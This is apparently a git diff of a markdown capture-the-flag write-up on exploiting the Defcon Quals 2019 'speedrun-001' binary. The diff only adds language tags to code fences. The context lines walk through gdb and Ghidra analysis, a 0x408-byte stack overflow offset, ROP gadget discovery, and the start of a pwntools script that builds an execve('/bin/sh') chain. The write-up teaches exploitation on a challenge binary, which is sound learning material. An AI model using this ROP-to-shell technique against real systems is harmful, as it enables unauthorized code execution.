@@ -1,7 +1,7 @@
 # Defcon Quals 2019 Speedrun1
 
 Let's take a look at the binary:
-```
+```console
 $    file speedrun-001
 speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
 $    pwn checksec speedrun-001
@@ -22,7 +22,7 @@ Alas, you had no luck today.
 
 So we can see that we are dealing with a 64 bit statically compiled binary. This binary has NX (Non-Executable stack) enabled, which means that the stack memory region is not executable. For more info on this, we can check the memory mappings with the `vmmap` command while the binary is running:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
@@ -40,7 +40,7 @@ Also since the binary is statically compiled, that means that the libc portions 
 
 When we run the binary, it essentially just prompts us for input. When we take a look at the binary in Ghidra, we see a long list of functions. To find out which one actually runs the code we look for, we can use the backtrace (`bt`) command in gdb when it prompts us for input, which will tell us the functions that have been called to reach the point we are at:
 
-```
+```gdb
 gef➤  r
 Starting program: /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
 Hello brave new challenger
@@ -107,7 +107,7 @@ gef➤  bt
 
 After this I started jumping to the various addresses listed there (you can just push `g` in ghidra and enter the address), and looked at the decompiled code to see what's interesting. After jumping to a few of them, `0x400c1d` looks like it's the main function:
 
-```
+```c
 
 undefined8
 main(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,undefined8 uParm5,
@@ -130,7 +130,7 @@ main(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,und
 
 When we look at the functions `FUN_00400b4d` and ` FUN_00400bae`, we see that the essentially just print out text (which matches with what we saw earlier). Looking at the `FUN_00400b60` function shows us something interesting:
 
-```
+```c
 void interesting(void)
 
 {
@@ -145,7 +145,7 @@ void interesting(void)
 
 So we can see it prints out a message, runs a function (which is based on using the binary and the order of the messages, probably scans in data), then prints a message with our input. Looking at the function `FUN_004498a0`, it seems a bit weird:
 
-```
+```c
 /* WARNING: Removing unreachable block (ram,0x00449910) */
 /* WARNING: Removing unreachable block (ram,0x00449924) */
 
@@ -167,7 +167,7 @@ undefined8 FUN_004498a0(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3)
 
 It appears to be scanning in our input by making a syscall, versus using a function like `scanf` or `fgets`. A syscall is essentially a way for your program to request your OS or Kernel to do something. Looking at the assembly code, we see that it sets the `RAX` register equal to `0` by xoring `eax` by itself. For the linux `x64` architecture, the contents of the `rax` register decides what syscall gets executed. And when we look on the syscall chart (https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) we see that it corresponds to the `read` syscall. We don't see the arguments being loaded for the syscall, since they were already loaded when this function was called. The arguments this function takes (and the registers they take it in) are the same as the read syscall, so it can just call it after it zeroes at `rax`. More on syscalls to come:
 
-```
+```nasm
         004498aa 31 c0           XOR        EAX,EAX
         004498ac 0f 05           SYSCALL
 ```
@@ -178,7 +178,7 @@ We will be making a ROP Chain (Return Oriented Programming) and using the buffer
 
 We will be making a rop chain to make a `sys_execve` syscall to execute `/bin/sh` to give us a shell. Looking at the chart posted earlier, we can see the values it expects. With that we know that we need the following registers to have the following values. We aren't too worried about the arguments or environment variables we pass to it, so we can just leave those `0x0` (null) to mean no arguments / environment variables:
 
-```
+```text
 rax:    59    Specify         sys_execve
 rdi:    ptr to "/bin/sh"    specify file to execute
 rsi:    0                    specify no arguments passed
@@ -187,7 +187,7 @@ rdx:    0                    specify no environment variables passed
 
 Now our ROP Chain will have three parts. The first will be to write `/bin/sh` somewhere in memory, and move the pointer to it into the `rdi` register. The second will be to move the necessary values into the other three registers. The third will be to make the syscall itself. Other than finding the gadgets to execute, the only thing we need to really do prior to writing the exploit is finding a place in memory to write `/bin/sh`. Let's check the memory mappings while the elf is running to see what we have to work with:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
@@ -207,7 +207,7 @@ gef➤  x/10g 0x6b6000
 
 Looking at this, the elf memory region between `0x6b6000` - `0x6bc000` looks pretty good. I'll probably go with the address `0x6b6000`. There are a few reasons why I choose this. The first is that it is from the elf's memory space that doesn't have PIE, so we know what the address is without an infoleak. In addition to that, the permissions are `rw` so we can read and write to it. Also there doesn't appear to be anything stored there at the moment, so it probably won't mess things up if we store it there. Also let's find the offset between the start of our input and the return address using the same method I've used before:
 
-```
+```gdb
 gef➤  b *0x400b90
 Breakpoint 1 at 0x400b90
 gef➤  r
@@ -281,7 +281,7 @@ Stack level 0, frame at 0x7fffffffde40:
 
 So we can see that the offset is `0x7fffffffde38 - 0x7fffffffda30 = 0x408` bytes. With that, the last thing we need is to find the ROP gadgets we will use. This time we will be using a utility called `ROPgadget` from https://github.com/JonathanSalwan/ROPgadget. This will just be a python script which will give us gadgets for a binary we give it. First let's just get four gadgets to just pop values into the four registers we need:
 
-```
+```console
 $    python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
 0x0000000000415662 : add ch, al ; pop rax ; ret
 0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
@@ -307,26 +307,26 @@ $    python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
 
 So we found our four gadgets at the addresses `0x415664`, `0x400686`, `0x4101f3`, and `0x4498b5`. Next we will need a gadget which will write the string `/bin/sh` somewhere to memory. For this I looked through all of the gadgets with a `mov` instruction:
 
-```
+```console
 $    python ROPgadget.py --binary speedrun-001 | grep "mov" | less
 ```
 
 Looking through the giant list, this one seems like it would fit our needs perfectly:
 
-```
+```nasm
 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
 ```
 
 This gadget will allow us to write an `8` byte value stored in `rdx` to whatever address is pointed to by the `rax` register. In addition it's kind of convenient since we can use the four gadgets we found earlier to prep this write. Lastly we just need to find a gadget for `syscall`:
 
-```
+```console
 $    python ROPgadget.py --binary speedrun-001 | grep ": syscall"
 0x000000000040129c : syscall
 ```
 
 Keep in mind that our ROP chain is comprised of addresses to instructions, and not the instructions themselves. So we will overwrite the return address with the first gadget of the ROP chain, and when it returns it will keep on going down the chain until we get our shell. Also for moving values into registers, we will store those values on the stack in the ROP Chain, and they will just be popped off into the registers. Putting it all together we get the following exploit:
 
-```
+```python
 from pwn import *
 
 target = process('./speedrun-001')
@@ -394,7 +394,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $    python exploit.py
 [+] Starting local process './speedrun-001': pid 12189
 [*] Switching to interactive mode
